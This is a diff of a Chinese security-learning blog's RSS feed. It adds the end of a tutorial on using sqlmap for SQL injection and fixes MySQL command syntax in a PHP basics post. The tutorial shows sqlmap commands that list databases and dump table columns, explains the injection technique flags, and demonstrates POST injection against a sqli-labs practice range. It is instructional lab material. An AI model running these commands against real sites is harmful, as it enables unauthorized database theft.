+&lt;p&gt;STEP4:&lt;code&gt;sqlmap -u [目标url] -D [库名] -T [表名] -C xxx,xxx --dump&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;获取表里指定栏目的数据&lt;/p&gt;
+&lt;p&gt;完毕&lt;/p&gt;
+&lt;p&gt;快速版（也需要分步添加参数）：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sqlmap -u [目标url] --dbs --batch --threads 10 --technique U&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;使用sqlmap查看目标网站的数据库库名，忽略错误，开10线程，使用union select注入目标网站&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;补充：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&amp;ndash;technique X 中后接参数的其他类型&lt;/p&gt;
+&lt;p&gt;E = 报错注入 &lt;em&gt;error based&lt;/em&gt;（无法发现报错位，但是数据库报错会出现）&lt;/p&gt;
+&lt;p&gt;B = 布尔型注入 &lt;em&gt;booled based&lt;/em&gt;（无法发现报错位，数据库闭合破坏也不出现，但是界面上只会出现&lt;strong&gt;有&lt;/strong&gt;和&lt;strong&gt;没有&lt;/strong&gt;东西两种情况）&lt;/p&gt;
+&lt;p&gt;T = 布尔型时间盲注 &lt;em&gt;time based&lt;/em&gt;（无法发现报错位，数据库闭合被破坏也不出现，界面上也没有出现消失东西的情况）&lt;/p&gt;
+&lt;h3 id=&#34;略微引申post类型的注入&#34;&gt;略微引申：POST类型的注入
+&lt;/h3&gt;&lt;p&gt;以靶场&lt;a class=&#34;link&#34; href=&#34;http://sqlilabs.njhack.xyz/Less-11/index.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://sqlilabs.njhack.xyz/Less-11/index.php&lt;/a&gt;为例&lt;/p&gt;
+&lt;p&gt;STEP1：随便提交数据，使用burp suite抓包&lt;/p&gt;
+&lt;p&gt;输入账号：admin1 密码：admin1&lt;/p&gt;
+&lt;p&gt;抓包得到post内容&lt;code&gt;uname=admin1&amp;amp;passwd=admin1&amp;amp;submit=Submit&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;STEP2：使用sqlmap注入&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sqlmap -u http://sqlilabs.njhack.xyz/Less-11/index.php --data &amp;quot;uname=admin1*&amp;amp;passwd=admin1&amp;amp;submit=Submit&amp;quot; --current-db --batch --threads 10 --technique U&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:#DF2A3F;&#34;&gt;注意：&amp;ndash;data后跟着的&lt;/font&gt;&lt;/strong&gt;&lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;&lt;strong&gt;&lt;font style=&#34;color:#DF2A3F;&#34;&gt;包裹字符串内容要在打击处用&lt;/font&gt;&lt;/strong&gt;&lt;code&gt;*&lt;/code&gt;&lt;strong&gt;&lt;font style=&#34;color:#DF2A3F;&#34;&gt;做标记&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;接下来的步骤略&lt;/p&gt;
+&lt;h2 id=&#34;拓展知识&#34;&gt;拓展知识
+&lt;/h2&gt;&lt;p&gt;web渗透中目标不同的组合：&lt;/p&gt;
+&lt;p&gt;Windows+iss+asp/aspx(asp.net)+access/mssql&lt;/p&gt;
+&lt;p&gt;Windows+apache+php+mysql = wamp （一般使用软件进行集成化搭建）&lt;/p&gt;
+&lt;p&gt;linux+apache/nginx+php+mysql = lamp/lnmp （又可能使用宝塔或其他面板搭建）&lt;/p&gt;
+&lt;p&gt;linux+tomcat+java(jsp)+oracle/mysql&lt;/p&gt;
+&lt;p&gt;linux+nginx+python(django/flask/tornado/fastapi)+go(beego/gin)+mysql&lt;/p&gt;
+&lt;hr&gt;
+</description>
+        </item>
+        <item>
         <title>1.4 php基础：用户交互与数据库交互</title>
         <link>https://www.retr0.xyz/p/1.4-php%E5%9F%BA%E7%A1%80%E7%94%A8%E6%88%B7%E4%BA%A4%E4%BA%92%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BA%A4%E4%BA%92/</link>
         <pubDate>Wed, 26 Nov 2025 23:11:40 +0800</pubDate>
@@ -731,9 +1013,9 @@
 &lt;p&gt;在此处启动CMD&lt;/p&gt;
 &lt;p&gt;下面是一些常用命令：&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;mysql -uroot -proot&lt;/code&gt;		登录数据库&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;show database&lt;/code&gt;			查看所有的库名&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;show databases;&lt;/code&gt;			查看所有的库名&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;use xxx&lt;/code&gt;				使用(定位)xxx这个库名&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;show tables&lt;/code&gt;			查看库中有什么表&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;show tables;&lt;/code&gt;			查看库中有什么表&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;select * from xxx&lt;/code&gt;		查看xxx这张表里的所有数据&lt;/p&gt;
 &lt;p&gt;此外所有php里的sql语句都可以在命令行之间使用&lt;/p&gt;
 </description>
